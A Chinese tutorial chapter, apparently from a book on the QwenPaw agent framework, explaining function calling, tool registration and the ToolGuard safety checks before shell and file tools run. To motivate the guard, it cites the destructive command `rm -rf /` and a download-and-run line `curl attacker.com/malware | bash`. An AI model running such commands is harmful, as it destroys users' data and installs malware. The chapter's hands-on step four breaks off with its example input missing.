# 第七章 工具的执行

```
浏览器 -> [HTTP/FastAPI] -> Runner -> Agent -> Prompt -> ReAct循环 -> [Tool执行] -> 响应
                                                                               |
                                                                            你在这里
```

## 问题：LLM 说"我需要执行一个 Shell 命令"，然后呢？

上一章我们跟着请求走进了 ReAct 循环。循环的第一步是 `_reasoning()`——大模型收到了对话历史和工具列表，开始思考。现在假设大模型想好了："用户想知道几点了，我需要调用 `get_current_time` 工具。"

问题是：大模型并不会真的去执行任何工具。它只是一段运行在远端服务器上的语言模型，没有手脚，没有文件系统，没有终端。它能做的，只是在回复里写一段 JSON，告诉我们："请帮我调用这个工具，参数如下。"

真正去执行工具的，是 Agent 那边的代码。而这段代码在执行之前，还得先过一道安全检查——万一这个 Shell 命令是 `rm -rf /` 怎么办？

这一章，我们就跟着大模型发出的工具调用请求，走完从 JSON 到真正执行、再从执行结果回到 ReAct 循环的全程。沿途会经过三个关键站点：Function Calling 协议、工具注册表、以及 ToolGuard 安全检查链。

---

## 术语其实很简单

> **术语：Function Calling（函数调用）**
> 想象你请了一位非常聪明但只能写信的顾问。你想让他帮你查天气，他办不到——他没有手机。但他可以在信里写："请帮我打电话给气象局，问一下北京今天的天气。"你收到信后，照他说的去打电话，把结果写在回信里寄过去。Function Calling 就是这个机制：大模型不会真的执行任何操作，它只是在回复里写一段结构化的 JSON，告诉调用方"请帮我调用这个工具"。调用方（也就是 Agent 代码）负责真正的执行。

> **术语：工具注册表（Toolkit）**
> 想象一个工具箱。里面有螺丝刀、扳手、钳子，每样工具上都贴着标签，写着名称和用法说明。大模型就像一个学徒——它能看到工具箱里有什么、每样工具怎么用，但只有师傅（Agent 代码）才能把工具从箱子里拿出来真正使用。在 QwenPaw 里，这个工具箱叫 `Toolkit`，初始化时把所有工具函数注册进去，然后把工具的"说明书"（名称、参数、描述）序列化成 JSON Schema，随请求一起发给大模型。大模型看到的就是一份工具清单，知道有哪些工具可用。

> **术语：ToolGuard（工具守卫）**
> 想象工厂里的安全检查站。每道工序开始之前，产品都要经过质检员的检查：合格就放行，有问题就拦下来报给主管。ToolGuard 就是这个质检员——在工具真正执行之前，它会检查工具的参数里有没有危险操作：Shell 命令里有没有注入攻击？文件路径有没有越界访问？如果发现了风险，工具执行就会被拦下，等待人类审批。这个机制叫"守卫"（Guard），对应的代码叫"守卫者"（Guardian）。

## 探索：从 LLM 的回复到工具执行结果

### 第一步：大模型说了什么？

大模型的回复有两种可能。第一种是纯文本："现在是北京时间下午三点。"这种情况下，ReAct 循环直接结束，把文本返回给用户。

第二种是包含一个或多个 `tool_use` 块。大模型不是用自然语言说"请帮我查时间"，而是用结构化的 JSON 表示：

```json
{
  "type": "tool_use",
  "id": "call_abc123",
  "name": "get_current_time",
  "input": {}
}
```

这段 JSON 里包含了三样东西：调哪个工具（`name`）、传什么参数（`input`）、以及一个唯一标识符（`id`），用来把执行结果和这次调用对应起来。

ReAct 循环检测到回复中有 `tool_use` 块后，就会调用 `_acting()`，把这个 JSON 传进去。接下来的事情，全在 `_acting()` 里发生。

### 第二步：Agent 怎么知道有哪些工具可用？

大模型怎么知道要调用 `get_current_time` 而不是 `get_weather`？因为它在请求里收到了一份"工具说明书"。这份说明书是怎么来的？

答案在 `_create_toolkit()` 方法里。当 Agent 初始化时，它创建一个空的 `Toolkit` 对象，然后把所有内置工具一个一个注册进去。用伪代码表示，就是这样的流程：

```python
# _create_toolkit() 的核心逻辑（简化）
toolkit = Toolkit()

# 从配置中读取哪些工具被启用
enabled_tools = load_enabled_tools_from_config()

# 所有内置工具的函数引用
tool_functions = {
    "execute_shell_command": execute_shell_command,
    "read_file": read_file,
    "write_file": write_file,
    "edit_file": edit_file,
    "grep_search": grep_search,
    "glob_search": glob_search,
    "get_current_time": get_current_time,       # <-- 最简单的工具
    "set_user_timezone": set_user_timezone,
    "browser_use": browser_use,
    # ... 还有更多
}

# 只注册启用的工具
for tool_name, tool_func in tool_functions.items():
    if enabled_tools.get(tool_name, True):
        toolkit.register_tool_function(tool_func)
```

注册时，`Toolkit` 会读取每个工具函数的 Python docstring 和类型注解，自动生成 JSON Schema 格式的工具描述。例如 `get_current_time` 的 docstring 写着"获取当前时间，格式为 `%Y-%m-%d %H:%M:%S TZ (Day)`"，这个描述就会被序列化后发给大模型。大模型看到这份工具清单后，就知道有哪些工具可用、每个工具需要什么参数。

最终，Agent 初始化后，工具注册表里可能有 18 个甚至更多的工具。这些工具分几大类：Shell 命令执行、文件读写、搜索（grep/glob）、浏览器操作、时间查询、Agent 间通信，以及用户自定义的 Skill 工具。

### 第三步：ToolGuard 安全检查链

当 `_acting()` 被调用时，工具并不会立刻执行。QwenPaw 在 Agent 和真正的工具执行之间，插入了一层安全检查——ToolGuard。这层检查的逻辑写在 `ToolGuardMixin` 里，通过 Python 的 MRO（方法解析顺序）机制，`ToolGuardMixin._acting()` 会先于 `ReActAgent._acting()` 被调用。

以下是 `_acting()` 的完整检查流程：

```
                _acting(tool_call) 收到工具调用请求
                          |
                          v
                ┌─────────────────────┐
                │ ToolGuard 是否启用？ │
                └────┬──────────┬─────┘
                     │          │
                未启用│          │启用
                     v          v
              直接执行      ┌──────────────────────┐
              super()       │ 工具在 denied 集合中？ │
                            └────┬────────────┬────┘
                                 │            │
                            不在 │            │ 在
                                 v            v
                          ┌──────────┐   自动拒绝
                          │ 有预审批？│   返回拒绝信息
                          └──┬───┬───┘   （auto_denied）
                             │   │
                        没有 │   │ 有
                             v   v
                     ┌──────────────┐  跳过检查，直接执行
                     │ 运行守卫者检查 │  （preapproved）
                     └────┬────┬────┘
                          │    │
                    无发现 │    │ 有发现（findings）
                          v    v
                     直接执行  需要审批
                     super()  （needs_approval）
                              拦截执行，等待用户确认
```

这个流程可以用四个关键词概括：

**auto_denied（自动拒绝）**——某些工具被配置为无条件禁止。比如管理员可以在配置里把某个危险工具加入 `denied_tools` 集合。一旦匹配，直接返回拒绝信息，不执行任何操作。

**preapproved（预审批）**——对于需要审批的工具，如果用户之前已经通过某种方式预先批准了这次调用（比如在 UI 上点了"批准"），那就跳过检查，直接执行。这个机制通过 `ApprovalService` 管理，每个审批令牌只能消费一次。

**needs_approval（需要审批）**——守卫者检查发现了风险（比如 Shell 命令中包含可疑的管道操作），但风险不够高到直接拒绝。这时工具执行被暂停，调用信息被写入待审批队列，等待人类用户确认。

**pass-through（直接通过）**——工具不在守卫范围内，或者守卫者检查没有发现任何问题。这时 `_acting()` 直接调用 `super()._acting()`，走到真正的工具执行逻辑。

守卫者检查本身由 `ToolGuardEngine` 协调。它管理着一组 `BaseToolGuardian` 实例，每个守卫者负责检测一类安全问题：

| 守卫者 | 检测内容 |
|--------|----------|
| `FilePathToolGuardian` | 文件路径越界访问、敏感文件读写 |
| `RuleBasedToolGuardian` | 基于规则的危险命令检测 |
| `ShellEvasionGuardian` | Shell 转义和注入攻击检测 |

每个守卫者的 `guard()` 方法接收工具名称和参数，返回一组 `GuardFinding`（安全发现）。每个发现包含严重程度（CRITICAL / HIGH / MEDIUM / LOW / INFO）、威胁类别（命令注入、路径穿越、数据泄露等）和详细的检测信息。`ToolGuardEngine` 把所有守卫者的发现汇总成一个 `ToolGuardResult`，交给 `_decide_guard_action()` 做最终决策。

值得注意的是，`_decide_guard_action()` 是在一个异步锁（`_tool_guard_lock`）内执行的。这是因为大模型可能在一次回复中发出多个并行的工具调用（`parallel_tool_calls=True`），不加锁的话多个工具调用可能同时读写共享状态，产生竞态条件。但实际的工具执行（包括 `preapproved` 和 `pass-through` 路径）在锁外运行，以保证并行性能。

### 第四步：真正的工具执行

安全检查通过后，`super()._acting()` 被调用。这是 `ReActAgent` 基类的实现，它做的事情很简单：根据工具名称，从 Toolkit 中找到对应的函数，用参数调用它，拿到返回值。

让我们看一个最简单的工具——`get_current_time`。它的完整代码只有不到 50 行：

```python
async def get_current_time() -> ToolResponse:
    """Get the current time in format `%Y-%m-%d %H:%M:%S TZ (Day)`,
    e.g. "2026-02-13 19:30:45 Asia/Shanghai (Friday)".
    """
    user_tz = load_config().user_timezone or "UTC"
    try:
        now = datetime.now(ZoneInfo(user_tz))
    except ZoneInfoNotFoundError:
        now = datetime.now(timezone.utc)
        user_tz = "UTC"

    time_str = (
        f"{now.strftime('%Y-%m-%d %H:%M:%S')} "
        f"{user_tz} ({now.strftime('%A')})"
    )
    return ToolResponse(
        content=[TextBlock(type="text", text=time_str)],
    )
```

这个工具没有任何参数，不需要安全检查，也不会有副作用。它做的事情只有一件：读取用户配置中的时区，获取当前时间，格式化成字符串，包在 `ToolResponse` 里返回。

返回值会被包装成一个 `tool_result` 消息，存入 memory：

```json
{
  "type": "tool_result",
  "id": "call_abc123",
  "name": "get_current_time",
  "output": [{"type": "text", "text": "2026-05-10 14:30:00 Asia/Shanghai (Sunday)"}]
}
```

然后，ReAct 循环回到开头，再次调用 `_reasoning()`。这一次，大模型收到了工具执行的结果，会生成纯文本回复："现在是北京时间 2026 年 5 月 10 日下午两点三十分，星期日。"循环检测到回复中没有 `tool_use` 块，于是跳出循环，把这个文本返回给用户。

### 更复杂的工具：Shell 命令执行

`get_current_time` 是最简单的情况。但 QwenPaw 最核心的工具是 `execute_shell_command`——它能让 Agent 在用户的机器上执行任意的 Shell 命令。这也是 ToolGuard 重点守护的对象。

Shell 工具的执行流程远比获取时间复杂。它需要处理跨平台差异（Windows 用 `cmd.exe`，Linux/macOS 用 `/bin/sh`）、超时控制（默认 60 秒）、进程组管理（超时后要杀掉整个进程树，而不是只杀主进程）、以及一个有趣的问题——LLM 生成的命令里可能包含 JSON 解码后产生的换行符。

看一小段关键代码。在 Unix 系统上，Shell 命令的执行是这样的：

```python
proc = await asyncio.create_subprocess_shell(
    cmd,
    stdout=asyncio.subprocess.PIPE,
    stderr=asyncio.subprocess.PIPE,
    cwd=str(working_dir),
    start_new_session=True,   # 创建新进程组，方便超时后杀整组
)

try:
    stdout, stderr = await asyncio.wait_for(
        proc.communicate(),
        timeout=timeout,
    )
except asyncio.TimeoutError:
    # 超时：杀掉整个进程组
    pgid = os.getpgid(proc.pid)
    os.killpg(pgid, signal.SIGTERM)
```

`start_new_session=True` 这行很关键。它让子进程在一个新的进程组（session）中运行，这样当命令超时需要强制终止时，`os.killpg()` 可以杀掉整个进程组——包括 Shell 命令启动的所有子进程。如果只杀主进程，子进程会变成孤儿进程，继续在后台运行。

文件读写工具（`read_file`、`write_file`、`edit_file`、`append_file`）也有自己的安全考量。所有相对路径都会从工作目录（`WORKING_DIR`）开始解析，而不是从系统根目录。文件读取有大小限制（通过 `max_bytes` 参数控制），超出部分会被截断并给出提示，告诉 Agent 如何读取剩余内容。

### 完整的工具调用流程

把所有步骤串起来，一次完整的工具调用流程如下：

```
   LLM 返回 tool_use JSON
           |
           v
   ┌──────────────────────────────────────────────────────────┐
   │  _acting(tool_call)                                      │
   │                                                          │
   │  1. ToolGuardMixin 拦截                                   │
   │     ├─ auto_denied?  --> 返回拒绝信息，不执行               │
   │     ├─ preapproved?  --> 跳过检查，直接执行                 │
   │     ├─ 运行 guardians                                     │
   │     │   ├─ FilePathGuardian  检查文件路径                  │
   │     │   ├─ RuleGuardian      检查危险命令                  │
   │     │   └─ ShellEvasionGuardian 检查注入攻击               │
   │     ├─ 有 findings? --> needs_approval，等待用户确认        │
   │     └─ 无 findings? --> pass-through                      │
   │                                                          │
   │  2. super()._acting(tool_call)  真正执行                   │
   │     从 Toolkit 中找到工具函数                               │
   │     调用 tool_func(**tool_input)                           │
   │     拿到 ToolResponse                                     │
   │                                                          │
   │  3. 把结果包装为 tool_result 消息，存入 memory              │
   └──────────────────────────────────────────────────────────┘
           |
           v
   回到 ReAct 循环，再次 _reasoning()
   大模型看到工具结果，生成最终回复
```

## 工程权衡：为什么要 ToolGuard？

读到这里，你可能会问一个很自然的问题：为什么要搞这么复杂的 ToolGuard？直接让 Agent 自由执行工具不行吗？

答案涉及三个维度的权衡。

**第一，安全性。** Agent 执行的是用户机器上的真实命令。一个被恶意 Prompt 注入攻击的大模型，可能会生成 `rm -rf /` 或者 `curl attacker.com/malware | bash` 这样的命令。没有安全检查，这些命令会被直接执行。ToolGuard 不是一个"锦上添花"的功能，而是一道必要的防线。它不是完全信任大模型的输出，而是在大模型和真实执行之间插入一层规则引擎。

**第二，成本。** 安全检查不是免费的。每次工具调用都要运行守卫者，守卫者要做正则匹配、路径解析、规则匹配。但这些都是纯本地的计算，不涉及网络请求，耗时通常在毫秒级。`ToolGuardResult` 里有一个 `guard_duration_seconds` 字段，记录了检查耗时。实际运行中，这个值很少超过 10 毫秒。相比于大模型推理动辄几秒的延迟，这个开销可以忽略不计。

**第三，用户体验。** 过于严格的安全检查会打断工作流——每执行一个命令都要人工审批，用户很快就会失去耐心。QwenPaw 的设计是分层防护：安全的工具（如 `get_current_time`）完全不需要检查，一般的命令自动通过，只有检测到风险时才拦截。这种"默认信任，风险拦截"的策略，在安全性和可用性之间找到了平衡点。

还有一个容易忽略的设计细节：`_decide_guard_action()` 在异步锁内运行，但工具执行在锁外。这意味着多个并行工具调用不会因为安全检查而串行等待——锁只保护决策过程本身，不保护执行过程。这个设计让并行工具调用的性能几乎不受 ToolGuard 的影响。

## 动手：执行一次安全的工具调用，观察日志

这一节的实验不需要写任何代码，只需要启动 QwenPaw，发送一条消息，然后观察日志。

**第一步：启动 QwenPaw，开启 DEBUG 日志。**

```bash
QWENPAW_LOG_LEVEL=DEBUG qwenpaw serve
```

`DEBUG` 级别的日志会显示工具注册、ToolGuard 检查、工具执行的详细过程。

**第二步：发送一个简单的问题。**

在聊天界面输入：

```
现在几点了？
```

**第三步：在终端日志中寻找以下关键信息。**

1. `Registered tool: get_current_time` —— 确认工具已注册
2. `QwenPawAgent.reply: max_iters=` —— 确认 ReAct 循环开始
3. 日志中出现 `tool_use` 相关信息 —— 大模型决定调用工具
4. 工具执行后的返回值 —— 包含时间字符串
5. 第二轮 `_reasoning` 后的纯文本回复 —— 大模型用自然语言回答了问题

**第四步：尝试一个更复杂的例子。**

输入：

## 小结

这一章我们跟着大模型发出的工具调用请求，走完了从 JSON 到执行的全程：

1. 大模型通过 Function Calling 协议返回 `tool_use` JSON，告诉 Agent 需要调用哪个工具、传什么参数
2. Agent 在初始化时通过 `_create_toolkit()` 把所有工具注册到 Toolkit 中，并将工具描述序列化为 JSON Schema 发给大模型
3. 工具执行前，ToolGuardMixin 通过 `_acting()` 拦截请求，运行四步安全检查链：auto_denied、preapproved、guardians、pass-through
4. 安全检查通过后，`super()._acting()` 真正调用工具函数，拿到 ToolResponse
5. 工具结果被包装成 `tool_result` 消息存入 memory，ReAct 循环再次进入 `_reasoning()`，大模型根据结果生成最终回复

下一章，我们将关注 ReAct 循环中的另一个关键问题：当对话历史越来越长，memory 里堆积了大量消息，大模型的输入长度快要爆了怎么办？答案是一种叫做"记忆压缩"的机制。
